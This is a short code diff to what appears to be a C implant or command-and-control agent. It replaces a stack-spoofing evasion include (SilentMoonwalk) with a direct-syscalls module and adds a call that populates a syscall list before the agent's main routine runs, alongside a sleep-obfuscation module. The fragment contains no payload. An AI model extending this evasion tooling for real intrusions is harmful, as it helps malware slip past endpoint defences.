@@ -3,7 +3,7 @@
 #include "../../headers/TaskController/TaskController.h"
 #include "../../headers/helpers/ListManager.h"
 #include "../../headers/agent/evasion/SleepObfu/SleepObfMain.h"
-#include "../../headers/agent/evasion/StackSpoof/SilentMoonwalk.h"
+#include "../../headers/agent/evasion/syscalls/syscalls.h"
 
 
 #ifdef _MSC_VER
@@ -18,7 +18,7 @@
 pAgent agent = { 0 };
 
 void AgentMain(PVOID RetAddr) {
-	
+
 	INT err;
 	Agent Agent = { 0 };
 	agent = &Agent;
@@ -32,6 +32,9 @@ void AgentMain(PVOID RetAddr) {
 	}
 
 	agent->Walker->RetAddr = GET_ADDRESS_OF_RETURN_ADDRESS();
+
+	if(!PopulateSyscallList())
+		printf("[error] attempting to populate syscall list\n");
 
 	AgentRoutine();
 
